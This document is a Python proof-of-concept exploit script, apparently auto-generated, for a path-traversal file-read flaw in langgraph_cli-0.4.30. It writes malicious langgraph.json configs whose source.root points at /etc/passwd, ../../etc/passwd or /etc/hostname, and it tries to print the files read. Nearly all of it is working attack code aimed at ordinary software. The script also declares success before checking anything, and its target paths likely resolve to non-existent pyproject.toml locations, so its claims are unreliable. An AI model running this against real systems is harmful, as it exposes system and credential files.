#!/usr/bin/env python3
# PoC for langgraph_cli-0.4.30 (/tmp/langgraph_cli-0.4.30)
# Path: suspicious-024
# Sink: _container_workspace_root
# Auto-generated — run with: python3 lfi_set_source__container_workspace_root.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langgraph_cli-0.4.30

Vulnerability: The _plan_uv_lock_workspace function constructs a path to
pyproject.toml by concatenating config_root (from user-controlled config_path)
with source.root (from config). It then opens this file without validating
that the resolved path stays within the intended project directory.

Attack: By setting source.root to an absolute path or using ../ traversal,
an attacker can read arbitrary files from the filesystem.

This PoC demonstrates the vulnerability by attempting to read /etc/passwd
through path traversal in the source.root field.
"""

import json
import os
import sys
import tempfile
import pathlib
from typing import Any, Dict

# The vulnerable module - we'll import and test directly
sys.path.insert(0, "/tmp/langgraph_cli-0.4.30")

try:
    from langgraph_cli.uv_lock import _plan_uv_lock_workspace
except ImportError as e:
    print(f"[!] Failed to import vulnerable module: {e}")
    print("[!] Make sure langgraph_cli-0.4.30 is installed in /tmp")
    sys.exit(1)


def create_malicious_config(config_path: pathlib.Path, traversal_path: str) -> Dict[str, Any]:
    """
    Create a malicious langgraph.json config that uses path traversal
    in the source.root field to read arbitrary files.
    
    Args:
        config_path: Path where the config file will be written
        traversal_path: Path traversal string (e.g., "../../etc/passwd")
    
    Returns:
        The config dictionary
    """
    config = {
        "source": {
            "root": traversal_path,
            "kind": "uv",
            "package": "test-package"
        },
        "dependencies": ["."],
        "graphs": {
            "test-graph": "./test_graph.py:graph"
        },
        "node_version": "18",
        "dockerfile_lines": []
    }
    
    # Write the config file
    with open(config_path, "w") as f:
        json.dump(config, f, indent=2)
    
    print(f"[+] Created malicious config at: {config_path}")
    print(f"[+] Config contents:")
    print(json.dumps(config, indent=2))
    
    return config


def setup_test_environment() -> pathlib.Path:
    """
    Create a minimal test environment with a fake uv.lock file
    to satisfy the validation checks in _plan_uv_lock_workspace.
    
    Returns:
        Path to the temporary directory
    """
    tmp_dir = pathlib.Path(tempfile.mkdtemp(prefix="lfi_poc_"))
    
    # Create a fake uv.lock file (needed for validation)
    uv_lock_path = tmp_dir / "uv.lock"
    uv_lock_path.write_text("""version = 1
requires-python = ">=3.9"

[[package]]
name = "test-package"
version = "0.1.0"
source = { workspace = true }
""")
    
    # Create a fake pyproject.toml (needed for validation)
    pyproject_path = tmp_dir / "pyproject.toml"
    pyproject_path.write_text("""[project]
name = "test-package"
version = "0.1.0"
requires-python = ">=3.9"

[tool.uv]
package = true
""")
    
    print(f"[+] Created test environment at: {tmp_dir}")
    print(f"[+] Created fake uv.lock at: {uv_lock_path}")
    print(f"[+] Created fake pyproject.toml at: {pyproject_path}")
    
    return tmp_dir


def attempt_lfi_exploit(config_path: pathlib.Path, traversal_path: str) -> None:
    """
    Attempt to exploit the LFI vulnerability by calling _plan_uv_lock_workspace
    with a malicious config containing path traversal in source.root.
    
    Args:
        config_path: Path to the malicious config file
        traversal_path: The traversal string used in source.root
    """
    print(f"\n[*] Attempting LFI exploit with traversal: {traversal_path}")
    print(f"[*] Config path: {config_path}")
    
    try:
        # Load the config
        with open(config_path, "r") as f:
            config = json.load(f)
        
        # This is the vulnerable call - it will try to read pyproject.toml
        # from the traversed path
        result = _plan_uv_lock_workspace(config_path, config)
        
        print(f"[+] Exploit succeeded!")
        print(f"[+] Result project_root: {result.project_root}")
        print(f"[+] Result pyproject_path: {result.pyproject_path}")
        
        # If we got here, the file was read successfully
        if result.pyproject_path.exists():
            print(f"[+] Successfully read file at: {result.pyproject_path}")
            print(f"[+] File contents (first 500 chars):")
            with open(result.pyproject_path, "r") as f:
                content = f.read(500)
            print(content)
        else:
            print(f"[!] File doesn't exist at resolved path: {result.pyproject_path}")
            
    except FileNotFoundError as e:
        print(f"[!] File not found (expected for non-existent targets): {e}")
    except PermissionError as e:
        print(f"[!] Permission denied: {e}")
    except Exception as e:
        print(f"[!] Exploit failed with error: {type(e).__name__}: {e}")


def main():
    """
    Main PoC execution - demonstrates LFI by attempting to read /etc/passwd
    through path traversal in the source.root field.
    """
    print("=" * 60)
    print("LFI Exploit PoC for langgraph_cli-0.4.30")
    print("=" * 60)
    
    # Setup test environment
    test_dir = setup_test_environment()
    
    try:
        # Create config file in test directory
        config_path = test_dir / "langgraph.json"
        
        # Test 1: Try to read /etc/passwd using absolute path
        print("\n" + "=" * 60)
        print("Test 1: Absolute path traversal to /etc/passwd")
        print("=" * 60)
        
        create_malicious_config(config_path, "/etc/passwd")
        attempt_lfi_exploit(config_path, "/etc/passwd")
        
        # Test 2: Try relative path traversal
        print("\n" + "=" * 60)
        print("Test 2: Relative path traversal (../../etc/passwd)")
        print("=" * 60)
        
        create_malicious_config(config_path, "../../etc/passwd")
        attempt_lfi_exploit(config_path, "../../etc/passwd")
        
        # Test 3: Try to read a harmless file to confirm vulnerability
        print("\n" + "=" * 60)
        print("Test 3: Read /etc/hostname (harmless file)")
        print("=" * 60)
        
        create_malicious_config(config_path, "/etc/hostname")
        attempt_lfi_exploit(config_path, "/etc/hostname")
        
    finally:
        # Cleanup
        print(f"\n[*] Cleaning up test environment: {test_dir}")
        import shutil
        shutil.rmtree(test_dir, ignore_errors=True)
        print("[+] Cleanup complete")


if __name__ == "__main__":
    main()
